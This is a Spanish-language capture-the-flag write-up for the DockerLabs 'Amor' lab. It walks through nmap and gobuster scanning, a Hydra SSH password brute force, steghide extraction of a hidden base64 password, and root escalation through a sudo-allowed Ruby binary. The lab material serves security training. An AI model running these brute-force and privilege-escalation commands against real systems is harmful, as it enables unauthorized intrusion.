## DockerLabs - Reto AMOR


Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto de dificultad Fácil. Tiene como objetivo introducir herramientas básicas de pentesting sobre entornos Docker usando técnicas de escaneo, fuerza bruta y esteganografía.

🛠 Prerrequisitos
Sistema base: Kali Linux

Docker instalado:

sudo apt install docker.io

🚚 Despliegue del Laboratorio
Transferir los archivos del reto:

scp -r amor kali@192.168.1.12:/home/kali/Documents/

Descomprimir recursos (si aplica):

unzip amor.zip
Otorgar permisos y ejecutar:

chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar
🔍 Reconocimiento
Obtener interfaz:

ip add
Descubrimiento de red:

sudo netdiscover -i docker0 -r 172.17.0.0/24
Escaneo de puertos:


sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
🌐 Enumeración Web
Accedemos al puerto 80 pero no hay información directa. Se lanza fuzzing:


gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
🔐 Ataque por Fuerza Bruta
Usuarios encontrados en el HTML del sitio: carlota y juan.

Ataque SSH usando Hydra:

bash
Copier
Modifier
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
Accedemos vía SSH:

ssh carlota@172.17.0.2
🖼 Extracción de Evidencia
Navegamos al directorio de imágenes:


cd /carlota/Desktop/fotos/vacaciones
Transferimos la imagen:


scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
Inspeccionamos el tipo de archivo:

file imagen.jpg
🕵‍♀ Esteganografía
Extraemos información oculta:


steghide extract -sf imagen.jpg
Decodificamos el contenido del archivo secreto:

echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo

🧑‍💻 Escalamiento de Privilegios

Accedemos como otro usuario:


su oscar
Comprobamos acceso con sudo:


sudo -l
Acceso a bash mediante Ruby:


sudo /usr/bin/ruby -e 'exec "/bin/bash"'
Verificamos identidad:

whoami



🧾 Cuadro de Herramientas Utilizadas
Se puede consultar el siguiente archivo Excel para la definición, funcionalidad y casos de uso de cada herramienta empleada: Resumen_Herramientas_DockerLabs.xlsx.

|     |    |    |


🧰 Comandos y Variantes
(Se sugiere agregar un archivo complementario comandos.md con descripciones detalladas de cada comando, sus parámetros y alternativas.)

🔁 Diagrama de Flujo


📌 Créditos
Laboratorio original: dockerlabs.es 
